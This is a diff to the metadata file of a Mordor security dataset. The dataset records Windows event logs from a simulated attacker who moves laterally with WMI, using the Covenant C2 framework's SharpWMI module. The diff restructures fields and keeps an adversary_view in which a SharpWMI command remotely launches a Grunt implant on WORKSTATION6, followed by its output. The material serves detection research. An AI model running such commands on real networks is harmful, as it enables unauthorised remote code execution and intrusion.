@@ -4,33 +4,33 @@ author: Roberto Rodriguez @Cyb3rWard0g
 creation_date: 2020/08/06
 modification_date: 2020/08/06
 platform: Windows
-simulation_environment: Mordor shire
-simulation_framework:
-  type: C2
-  name: Covenant
-  module: SharpWMI
-  script: https://github.com/cobbr/Covenant/blob/19e4a17048ade1b854241bb5d938398860ab5981/Covenant/Data/Tasks/GhostPack.yaml
-permissions_required:
-  - Administrator
 description: This dataset represents a threat actor leveragin WMI to create processes and execute code remotely via the RemoteCreateInstance method.
 dataset:
-  - size: small
-    type: Windows Event Logs
+  - type: Windows Event Logs
     link: https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/lateral_movement/covenant_sharpwmi_dcerpc_wmi_remotecreateinstance.zip
 attack_mappings:
   - technique: T1047
     sub-technique:
     tactics:
       - TA0008
-analytics_validation: 
-adversary_view: |-
-  (wardog) > SharpWMI /command:"action=exec computername=WORKSTATION6 command=\"C:\\Windows\\System32\\GruntHTTP2.exe\""
+notebooks:
+simulator:
+  environment: Mordor shire
+  tools:
+    - type: C2
+      name: Covenant
+      module: SharpWMI
+      script: https://github.com/cobbr/Covenant/blob/19e4a17048ade1b854241bb5d938398860ab5981/Covenant/Data/Tasks/GhostPack.yaml
+  permissions_required:
+    - Administrator 
+  adversary_view: |-
+    (wardog) > SharpWMI /command:"action=exec computername=WORKSTATION6 command=\"C:\\Windows\\System32\\GruntHTTP2.exe\""
 
-  [*] Host                           : WORKSTATION6
+    [*] Host                           : WORKSTATION6
 
-  [*] Command                        : "C:\\Windows\\System32\\GruntHTTP2.exe"
+    [*] Command                        : "C:\\Windows\\System32\\GruntHTTP2.exe"
 
-  [*] Creation of process returned   : 0
+    [*] Creation of process returned   : 0
 
-  [*] Process ID                     : 3824
+    [*] Process ID                     : 3824
 references:
